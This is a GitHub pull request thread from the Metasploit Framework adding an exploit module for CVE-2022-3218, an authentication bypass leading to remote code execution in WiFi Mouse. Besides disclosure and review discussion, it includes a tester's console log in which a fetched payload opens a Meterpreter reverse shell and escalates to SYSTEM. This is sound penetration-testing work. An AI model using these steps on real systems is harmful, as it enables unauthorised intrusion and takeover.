
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16985)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16985)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.5k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  414](/rapid7/metasploit-framework/issues)
* [Pull requests
  37](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# wifi mouse auth bypass to rce - CVE-2022-3218 #16985

 Merged

[gwillcox-r7](/gwillcox-r7)
merged 10 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[h00die:mouse\_server](/h00die/metasploit-framework/tree/mouse_server "h00die/metasploit-framework:mouse_server")

Sep 23, 2022

 Merged

# [wifi mouse auth bypass to rce - CVE-2022-3218](#top) #16985

[gwillcox-r7](/gwillcox-r7)
merged 10 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[h00die:mouse\_server](/h00die/metasploit-framework/tree/mouse_server "h00die/metasploit-framework:mouse_server")

Sep 23, 2022

[Conversation
20](/rapid7/metasploit-framework/pull/16985)
[Commits
10](/rapid7/metasploit-framework/pull/16985/commits)
[Checks
0](/rapid7/metasploit-framework/pull/16985/checks)
[Files changed](/rapid7/metasploit-framework/pull/16985/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![h00die](https://avatars.githubusercontent.com/u/752491?s=60&v=4)](/h00die)

Copy link

Contributor

### @h00die **[h00die](/h00die)** commented [Sep 5, 2022](#issue-1361864139) • edited by gwillcox-r7 Loading

This PR adds a new module to exploit an auth bypass to rce in 'wifi mouse'.

[@H4rk3nz0](https://github.com/H4rk3nz0) looks like you were the original author (and your twitter is gone), did you ever reach out to the company to responsibly disclose?

This is a neat exploit as you connect to the server, ask it to open cmd, then type out what you want on the user's screen. its fun to watch shell code :).

There is 1 target: stager which has 2 cmdstagers:

1. `psh_invokewebrequest` (default) this one types the command and pulls back the payload nice and fast. You should use it in almost all circumstances
2. `certutil` it appearing on the user's screen, its unreliable (needs ~3.5min of solitude). If the user types anything or moves the focus to another window, exploit will fail.

## Verification

* install and start software. i tried it on the one linked in EDB and the most recent one on the website
* Start `msfconsole`
* `use exploit/windows/misc/wifi_mouse_rce`
* Set `rhost` and `lhost` as required.
* `run`
* **Verify** it works via both methods (targets)
* **Document** looks good

Sorry, something went wrong.

All reactions

 [h00die](/h00die)
added 2 commits
[September 5, 2022 08:16](#commits-pushed-3f7e066)

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[wifi mouse rce](/rapid7/metasploit-framework/pull/16985/commits/3f7e0667f65d30bcd46b67ccff711c8194a2c393 "wifi mouse rce")`

`[3f7e066](/rapid7/metasploit-framework/pull/16985/commits/3f7e0667f65d30bcd46b67ccff711c8194a2c393)`

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[fix docs](/rapid7/metasploit-framework/pull/16985/commits/c6d453f5b9eac71ee2f4e97195691beff75ab1c9 "fix docs")`

`[c6d453f](/rapid7/metasploit-framework/pull/16985/commits/c6d453f5b9eac71ee2f4e97195691beff75ab1c9)`

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)
[h00die](/h00die)
added
[module](/rapid7/metasploit-framework/labels/module)
[docs](/rapid7/metasploit-framework/labels/docs)
labels
[Sep 5, 2022](#event-7322588185)

[![@H4rk3nz0](https://avatars.githubusercontent.com/u/54619779?s=80&u=c6b4ec16ff148947f8ee8cb17ef0f6b2bbd6aadb&v=4)](/H4rk3nz0)

Copy link

### **[H4rk3nz0](/H4rk3nz0)** commented [Sep 5, 2022](#issuecomment-1236959906)

| Hi [@h00die](https://github.com/h00die) ,  I made two attempts to get in contact with the developer through their email on their site. Despite my efforts to inform them of the password pin bypass they did not respond. It may be worthy of a CVE however I never did raise it to any CVE body. Awesome job on the well designed msf module. Let me know if you need anything else. |
| --- |

All reactions

Sorry, something went wrong.

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=80&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)

Copy link

Contributor

Author

### **[h00die](/h00die)** commented [Sep 5, 2022](#issuecomment-1237237531)

| [@H4rk3nz0](https://github.com/H4rk3nz0) do you have dates for when you reached out, and to what email (or a timeline in general you can share)? Just for making sure we have all the ducks in a line for the CVE |
| --- |

All reactions

Sorry, something went wrong.

[![@H4rk3nz0](https://avatars.githubusercontent.com/u/54619779?s=80&u=c6b4ec16ff148947f8ee8cb17ef0f6b2bbd6aadb&v=4)](/H4rk3nz0)

Copy link

### **[H4rk3nz0](/H4rk3nz0)** commented [Sep 5, 2022](#issuecomment-1237314344)

| [@h00die](https://github.com/h00die) I reached out on the 25th of Feb 2021 to developer email (wangshimeng@gmail.com). The same day as I discovered the flaw. |
| --- |

All reactions

Sorry, something went wrong.

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)
[h00die](/h00die)
mentioned this pull request
[Sep 7, 2022](#ref-pullrequest-1363985943)

[unified\_remote exploit
#16989](/rapid7/metasploit-framework/pull/16989)
 Merged

7 tasks

[![adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=60&v=4)](/adfoster-r7)

**[adfoster-r7](/adfoster-r7)**
reviewed
[Sep 8, 2022](#pullrequestreview-1100823538)

 [View reviewed changes](/rapid7/metasploit-framework/pull/16985/files/c6d453f5b9eac71ee2f4e97195691beff75ab1c9)

[modules/exploits/windows/misc/wifi\_mouse\_rce.rb](/rapid7/metasploit-framework/pull/16985/files/c6d453f5b9eac71ee2f4e97195691beff75ab1c9#diff-e10084b3675ac8b4c60be4bbfad7fbed59b906b0c732aaa249ec2daac02eabad)
Outdated

Show resolved

Hide resolved

 [h00die](/h00die)
added 2 commits
[September 9, 2022 05:57](#commits-pushed-66bbe98)

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[wifi remote with better cmd stagers](/rapid7/metasploit-framework/pull/16985/commits/66bbe98f5fd21f38928f160430527eca98c9d981 "wifi remote with better cmd stagers")`

`[66bbe98](/rapid7/metasploit-framework/pull/16985/commits/66bbe98f5fd21f38928f160430527eca98c9d981)`

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[wifi remote remove unused code](/rapid7/metasploit-framework/pull/16985/commits/803fff9003f66e909863185a794fe1d29a677726 "wifi remote remove unused code")`

`[803fff9](/rapid7/metasploit-framework/pull/16985/commits/803fff9003f66e909863185a794fe1d29a677726)`

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=80&v=4)](/todb-r7)

Copy link

### **[todb-r7](/todb-r7)** commented [Sep 14, 2022](#issuecomment-1247282227) • edited Loading

| Hi [@h00die](https://github.com/h00die) thanks for the alert. I've reserved [CVE-2022-3218](https://github.com/advisories/GHSA-9ccj-j63p-ch9p "CVE-2022-3218") for this. Salient details:  Product name: WiFi Mouse (Mouse Server) Vendor: Necta LLC Version: 1.8.2.3 CWE-603: Use of Client-Side Authentication  Description: Due to a reliance on client-side authentication, the WiFi Mouse (Mouse Server) from Necta LLC’s authentication mechanism is trivially bypassed, which can result in remote code execution. |
| --- |

All reactions

Sorry, something went wrong.

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[cve for wifi mouse](/rapid7/metasploit-framework/pull/16985/commits/bf1ebe19a6df4fdd4f8f3c6dca94c7a890a3f006 "cve for wifi mouse")`

`[bf1ebe1](/rapid7/metasploit-framework/pull/16985/commits/bf1ebe19a6df4fdd4f8f3c6dca94c7a890a3f006)`

 [![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)
[h00die](/h00die)
marked this pull request as ready for review
[September 15, 2022 19:13](#event-7397673937)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
self-assigned this
[Sep 19, 2022](#event-7417431139)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&v=4)](/gwillcox-r7)

`[Fix up documentation](/rapid7/metasploit-framework/pull/16985/commits/605db0160d32fff485ec9cd7a3f7e6bd125cb046 "Fix up documentation")`

`[605db01](/rapid7/metasploit-framework/pull/16985/commits/605db0160d32fff485ec9cd7a3f7e6bd125cb046)`

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
suggested changes
[Sep 21, 2022](#pullrequestreview-1115986539)

 [View reviewed changes](/rapid7/metasploit-framework/pull/16985/files/bf1ebe19a6df4fdd4f8f3c6dca94c7a890a3f006)

Copy link

Contributor

### @gwillcox-r7 **[gwillcox-r7](/gwillcox-r7)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Reviewed documentation, review on module code to come next.

Sorry, something went wrong.

All reactions

[documentation/modules/exploit/windows/misc/wifi\_mouse\_rce.md](/rapid7/metasploit-framework/pull/16985/files/bf1ebe19a6df4fdd4f8f3c6dca94c7a890a3f006#diff-d2d32d8477bfda607f21778fde1e478cc48ef72ccc09e1da51642b2cc434ab07)

Show resolved

Hide resolved

[documentation/modules/exploit/windows/misc/wifi\_mouse\_rce.md](/rapid7/metasploit-framework/pull/16985/files/bf1ebe19a6df4fdd4f8f3c6dca94c7a890a3f006#diff-d2d32d8477bfda607f21778fde1e478cc48ef72ccc09e1da51642b2cc434ab07)

Show resolved

Hide resolved

[documentation/modules/exploit/windows/misc/wifi\_mouse\_rce.md](/rapid7/metasploit-framework/pull/16985/files/bf1ebe19a6df4fdd4f8f3c6dca94c7a890a3f006#diff-d2d32d8477bfda607f21778fde1e478cc48ef72ccc09e1da51642b2cc434ab07)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/windows/misc/wifi\_mouse\_rce.md](/rapid7/metasploit-framework/pull/16985/files/bf1ebe19a6df4fdd4f8f3c6dca94c7a890a3f006#diff-d2d32d8477bfda607f21778fde1e478cc48ef72ccc09e1da51642b2cc434ab07)

Show resolved

Hide resolved

[![@H4rk3nz0](https://avatars.githubusercontent.com/u/54619779?s=80&u=c6b4ec16ff148947f8ee8cb17ef0f6b2bbd6aadb&v=4)](/H4rk3nz0)

Copy link

### **[H4rk3nz0](/H4rk3nz0)** commented [Sep 21, 2022](#issuecomment-1254187940)

| I see the layer 8 issue has arisen. |
| --- |

All reactions

Sorry, something went wrong.

 [h00die](/h00die)
added 2 commits
[September 21, 2022 16:35](#commits-pushed-32402c0)

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[wifi mouse doc updates](/rapid7/metasploit-framework/pull/16985/commits/32402c0e6d4e8b2fdab09d617f7f71f788d8b159 "wifi mouse doc updates")`

`[32402c0](/rapid7/metasploit-framework/pull/16985/commits/32402c0e6d4e8b2fdab09d617f7f71f788d8b159)`

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&v=4)](/h00die)

`[wifi mouse doc updates](/rapid7/metasploit-framework/pull/16985/commits/eb516f402ec27d8071d10386e826a488cb57fc56 "wifi mouse doc updates")`

`[eb516f4](/rapid7/metasploit-framework/pull/16985/commits/eb516f402ec27d8071d10386e826a488cb57fc56)`

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=80&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)

Copy link

Contributor

Author

### **[h00die](/h00die)** commented [Sep 21, 2022](#issuecomment-1254204714)

| updated the docs w/ some of your changes, and a bunch of the review comments. Things should be clearer now for the starger/target stuff |
| --- |

 ❤️
1
 gwillcox-r7 reacted with heart emoji

All reactions

* ❤️
  1 reaction

Sorry, something went wrong.

 [gwillcox-r7](/gwillcox-r7)
added 2 commits
[September 23, 2022 14:08](#commits-pushed-b62f163)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&v=4)](/gwillcox-r7)

`[Update documentation on module and exploit a little more to make thin…](/rapid7/metasploit-framework/pull/16985/commits/b62f163696eb5e19d05a5d621b3efda9804197be "Update documentation on module and exploit a little more to make things a bit clearer")`
 …

`[b62f163](/rapid7/metasploit-framework/pull/16985/commits/b62f163696eb5e19d05a5d621b3efda9804197be)`

```
…gs a bit clearer
```

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&v=4)](/gwillcox-r7)

`[Fix a typo](/rapid7/metasploit-framework/pull/16985/commits/828cdb8862344ce18c289474d89890c0e371b2e8 "Fix a typo")`

`[828cdb8](/rapid7/metasploit-framework/pull/16985/commits/828cdb8862344ce18c289474d89890c0e371b2e8)`

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Sep 23, 2022](#issuecomment-1256588246)

| Tested and working like a charm. Pushing up final minor edits for documentation purposes and then this will be good to land.  ``` msf6 > use exploit/windows/misc/wifi_mouse_rce [*] Using configured payload windows/shell/reverse_tcp msf6 exploit(windows/misc/wifi_mouse_rce) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/misc/wifi_mouse_rce) > set RHOSTS 172.20.16.241 RHOSTS => 172.20.16.241 msf6 exploit(windows/misc/wifi_mouse_rce) > set LHOST 172.20.18.73 LHOST => 172.20.18.73 msf6 exploit(windows/misc/wifi_mouse_rce) > show options  Module options (exploit/windows/misc/wifi_mouse_rce):     Name     Current Setting  Required  Description    ----     ---------------  --------  -----------    LINEMAX  1020             yes       Maximum length of lines to send for stager method.  Smaller for more unstable connections.    RHOSTS   172.20.16.241    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit    RPORT    1978             yes       Port WiFi Mouse Mouse Server runs on (TCP)    SLEEP    1                yes       How long to sleep between commands    SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.    SRVPORT  8080             yes       The local port to listen on.    SSL      false            no        Negotiate SSL for incoming connections    SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)    URIPATH                   no        The URI to use for this exploit (default is random)   Payload options (windows/x64/meterpreter/reverse_tcp):     Name      Current Setting  Required  Description    ----      ---------------  --------  -----------    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)    LHOST     172.20.18.73     yes       The listen address (an interface may be specified)    LPORT     4444             yes       The listen port   Exploit target:     Id  Name    --  ----    0   stager   msf6 exploit(windows/misc/wifi_mouse_rce) > exploit  [*] Started reverse TCP handler on 172.20.18.73:4444  [*] 172.20.16.241:1978 - Opening command prompt [*] 172.20.16.241:1978 - Typing out payload [*] 172.20.16.241:1978 - Using URL: http://172.20.18.73:8080/e0YwYxi [*] 172.20.16.241:1978 - Client 172.20.16.241 (Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.20348.859) requested /e0YwYxi [*] 172.20.16.241:1978 - Sending payload to 172.20.16.241 (Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.20348.859) [*] Sending stage (200774 bytes) to 172.20.16.241 [*] 172.20.16.241:1978 - Command Stager progress - 100.00% done (145/145 bytes) [*] Meterpreter session 1 opened (172.20.18.73:4444 -> 172.20.16.241:60802) at 2022-09-23 14:19:28 -0500 [*] 172.20.16.241:1978 - Server stopped.  meterpreter > getuid Server username: DAFOREST\Administrator meterpreter > sysinfo Computer        : WIN-BR0CCBA815B OS              : Windows 2016+ (10.0 Build 20348). Architecture    : x64 System Language : en_US Domain          : DAFOREST Logged On Users : 12 Meterpreter     : x64/windows meterpreter > getprivs  Enabled Process Privileges ==========================  Name ---- SeBackupPrivilege SeChangeNotifyPrivilege SeCreateGlobalPrivilege SeCreatePagefilePrivilege SeCreateSymbolicLinkPrivilege SeDebugPrivilege SeEnableDelegationPrivilege SeImpersonatePrivilege SeIncreaseBasePriorityPrivilege SeIncreaseQuotaPrivilege SeIncreaseWorkingSetPrivilege SeLoadDriverPrivilege SeMachineAccountPrivilege SeManageVolumePrivilege SeProfileSingleProcessPrivilege SeRemoteShutdownPrivilege SeRestorePrivilege SeSecurityPrivilege SeShutdownPrivilege SeSystemEnvironmentPrivilege SeSystemProfilePrivilege SeSystemtimePrivilege SeTakeOwnershipPrivilege SeTimeZonePrivilege SeUndockPrivilege  meterpreter > getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)). meterpreter > getuid Server username: NT AUTHORITY\SYSTEM meterpreter >   ``` |
| --- |

All reactions

Sorry, something went wrong.

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
approved these changes
[Sep 23, 2022](#pullrequestreview-1118951532)

 [View reviewed changes](/rapid7/metasploit-framework/pull/16985/files/eb516f402ec27d8071d10386e826a488cb57fc56)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
changed the title
~~wifi mouse rce~~
wifi mouse rce - CVE-2022-3218
[Sep 23, 2022](#event-7449945106)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
added
the
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules
label
[Sep 23, 2022](#event-7449949777)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
merged commit [`0908006`](/rapid7/metasploit-framework/commit/09080064663d42025d1908221450c4eb40c677e8)
into
rapid7:master

[Sep 23, 2022](https://github.com/rapid7/metasploit-framework/pull/16985#event-7449951059)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
changed the title
~~wifi mouse rce - CVE-2022-3218~~
wifi mouse auth bypass to rce - CVE-2022-3218
[Sep 23, 2022](#event-7449957996)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [Sep 23, 2022](#issuecomment-1256613769) • edited Loading

| Release Notes A new module has been added for [CVE-2022-3218](https://github.com/advisories/GHSA-9ccj-j63p-ch9p "CVE-2022-3218"), an unpatched (at the time of publication) authentication bypass in WiFi Mouse (Mouse Server) from Necta LLC which can be used to gain RCE as the user running Wifi Mouse (Mouse Server). |
| --- |

All reactions

Sorry, something went wrong.

 [![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)
[h00die](/h00die)
deleted the
mouse\_server

branch
[September 23, 2022 21:27](#event-7450407584)

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=40&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)
[h00die](/h00die)
mentioned this pull request
[Oct 7, 2022](#ref-pullrequest-1393013536)

[remote control collection rce
#17087](/rapid7/metasploit-framework/pull/17087)
 Merged

9 tasks

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16985)

Reviewers

[![@adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=40&v=4)](/adfoster-r7) [adfoster-r7](/adfoster-r7)

adfoster-r7 left review comments

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&v=4)](/gwillcox-r7) [gwillcox-r7](/gwillcox-r7)

gwillcox-r7 approved these changes

Assignees

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&v=4)](/gwillcox-r7) [gwillcox-r7](/gwillcox-r7)

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules

Projects

[Metasploit Kanban](/orgs/rapid7/projects/17)

Archived in project

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

5 participants

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=52&v=4)](/h00die) [![@H4rk3nz0](https://avatars.githubusercontent.com/u/54619779?s=52&v=4)](/H4rk3nz0) [![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=52&v=4)](/todb-r7) [![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=52&v=4)](/gwillcox-r7) [![@adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=52&v=4)](/adfoster-r7)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

